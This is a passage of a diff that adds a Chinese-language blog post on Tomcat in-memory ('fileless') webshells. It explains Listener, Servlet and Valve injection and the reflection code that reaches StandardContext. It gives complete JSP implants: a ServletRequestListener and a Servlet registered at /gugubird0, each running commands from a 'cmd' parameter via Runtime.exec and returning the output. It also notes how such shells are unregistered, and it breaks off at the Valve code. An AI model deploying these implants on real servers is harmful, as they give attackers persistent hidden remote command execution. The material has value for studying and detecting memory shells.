+                <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">=</span> <span class="n">serverNameMB</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+                <span class="o">}</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span> <span class="n">uriMB</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;uriMB&#34;</span><span class="o">);</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">uriMB</span><span class="o">,</span> <span class="s">&#34;strValue&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="n">uriMB</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+                <span class="o">}</span>
+                <span class="c1">//根据获取到的服务器名、路径信息获取StandardContext
+</span><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">getStandardContext</span><span class="o">();</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">getStandardContext</span><span class="o">()</span> <span class="o">{</span>
+            <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">GetAcceptorThread</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">Object</span> <span class="n">service</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;proto&#34;</span><span class="o">),</span> <span class="s">&#34;adapter&#34;</span><span class="o">),</span> <span class="s">&#34;connector&#34;</span><span class="o">),</span> <span class="s">&#34;service&#34;</span><span class="o">);</span>
+            <span class="n">StandardEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardEngine</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">service</span><span class="o">,</span> <span class="s">&#34;container&#34;</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">engine</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">engine</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardEngine</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">service</span><span class="o">,</span> <span class="s">&#34;engine&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="n">HashMap</span> <span class="n">children</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">engine</span><span class="o">,</span> <span class="s">&#34;children&#34;</span><span class="o">);</span>
+            <span class="n">StandardHost</span> <span class="n">standardHost</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardHost</span><span class="o">)</span> <span class="n">children</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">serverName</span><span class="o">);</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">standardHost</span><span class="o">==</span><span class="kc">null</span><span class="o">){</span>
+                <span class="n">standardHost</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardHost</span><span class="o">)</span> <span class="n">children</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">children</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">standardHost</span><span class="o">,</span> <span class="s">&#34;children&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">children</span><span class="o">.</span><span class="na">keySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">String</span> <span class="n">contextKey</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">contextKey</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()||!(</span><span class="k">this</span><span class="o">.</span><span class="na">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">contextKey</span><span class="o">)))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">children</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">contextKey</span><span class="o">);</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">standardContext</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">;</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="n">StandardContext</span> <span class="nf">getSTC</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">standardContext</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>注销Filter内存马</strong></p>
+<p>Tomcat注销filter其实就是将该Filter从全局filterDefs和filterMaps中清除掉。具体的操作分别如下removeFilterDef和removeFilterMap两个方法中，只需要反射调用它们即可注销Filter。</p>
+<h2 id="listener"><a href="#listener" class="anchor-link">#</a><a href="#contents:listener" class="headings">Listener</a></h2>
+<p>Tomcat对这三个功能组件的加载顺序是: <code>listener -&gt; filter -&gt; servlet</code> 。</p>
+<p>监听器用于监听Web应用中某些对象的创建、销毁、增加，修改，删除等动作的发生，然后作出相应的响应处理。当监听范围的对象状态发生变化的时候，服务器自动调用监听器对象中的方法。常用于统计网站在线人数、系统加载时进行信息初始化、统计网站的访问量等等。</p>
+<p>Listener主要分为三个大类:</p>
+<ol>
+<li>ServletContext监听: 用于对Servlet整个上下文进行监听（创建、销毁）</li>
+<li>Session监听: 对Session的整体状态的监听</li>
+<li>Request监听: 用于对Request请求进行监听（创建、销毁）</li>
+</ol>
+<p>前两种不适合作为内存Webshell，因为ServletContext涉及到服务器的启动跟停止或是Session的建立跟销毁时才会执行监听器中的代码。适合拿来作为内存马的是ServletRequestListener，它主要用于监听ServletRequest对象的创建和销毁。</p>
+<p>在StandardHostValve的Invoke方法中调用:<code>context.fireRequestInitEvent(request.getRequest())</code> 并在fireRequestInitEvent方法中遍历当前StandardContext的所有Listener并进行初始化。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span> <span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;javax.servlet.*&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span> <span class="o">%&gt;</span>
+
+<span class="o">&lt;%</span>
+    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+    <span class="n">Field</span> <span class="n">appctx</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+    <span class="n">Field</span> <span class="n">stdctx</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">stdctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+    <span class="n">ServletRequestListener</span> <span class="n">servletRequestListener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletRequestListener</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+                    <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+                    <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+                    <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
+                    <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span><span class="c1">//执行结果加上回车
+</span><span class="c1"></span>                    <span class="o">}</span>
+                    <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">};</span>
+    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">servletRequestListener</span><span class="o">);</span>
+    <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;inject success&#34;</span><span class="o">);</span>
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>不能直接用ApplicationContext的addLisener添加Listener，因为该方法首先会判断web应用是不是已经初始化运行了，如果是的话则不能在中途添加Listener（addFilter方法也是这个道理）。所以需要通过反射去调用StandardContext对象的addApplicationEventListener方法来添加Listenner。</p>
+<h2 id="servlet"><a href="#servlet" class="anchor-link">#</a><a href="#contents:servlet" class="headings">Servlet</a></h2>
+<p>Servlet是运行在Web服务器或应用服务器上的程序，它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。Servlet的生命周期开始于Web容器的启动，它会被加载到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束（Servlet的service方法由ApplicationFilterChain的internalDoFilter方法调用）。</p>
+<p>Tomcat的一个Wrapper代表一个Servlet ，而Servlet的Wrapper对象均在StandardContext的children属性中。所以这里创建以给Wrapper对象，把servlet写进去后直接用standardContext.addChild()添加到children。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStream&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.Scanner&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Wrapper&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span> <span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span>
+    <span class="n">Servlet</span> <span class="n">servlet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Servlet</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+            <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+            <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
+                <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
+            <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
+            <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\a&#34;</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+            <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ServletConfig</span> <span class="n">servletConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="n">ServletConfig</span> <span class="nf">getServletConfig</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getServletInfo</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+    <span class="o">};</span>
+    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+
+    <span class="n">Field</span> <span class="n">appctx</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">stdctx</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">stdctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+
+    <span class="n">Wrapper</span> <span class="n">newWrapper</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">createWrapper</span><span class="o">();</span>
+    <span class="n">String</span> <span class="n">servletName</span><span class="o">=</span><span class="s">&#34;ff&#34;</span><span class="o">;</span>
+    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servletName</span><span class="o">);</span>
+    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setLoadOnStartup</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">servlet</span><span class="o">);</span>
+    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+    <span class="n">standardContext</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">newWrapper</span><span class="o">);</span>
+<span class="c1">//将Wrapper对象和访问的url绑定
+</span><span class="c1"></span>    <span class="n">standardContext</span><span class="o">.</span><span class="na">addServletMapping</span><span class="o">(</span><span class="s">&#34;/gugubird0&#34;</span><span class="o">,</span> <span class="n">servletName</span><span class="o">);</span>
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>注销Servlet的原理也是类似，将该Servlet从全局servletMappings和children中清除掉即可。在Tomcat源码中对应的是removeServletMapping和removeChild方法。</p>
+<h2 id="valve"><a href="#valve" class="anchor-link">#</a><a href="#contents:valve" class="headings">Valve</a></h2>
+<p>通过获取standardContext容器的Pipeline链，插入自定义的Valve对象。（Valve的机制见前文介绍）</p>
+<p>通过<code>standardContext.getPipeline().getFirst().getNext()</code>获取到添加的Valve。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
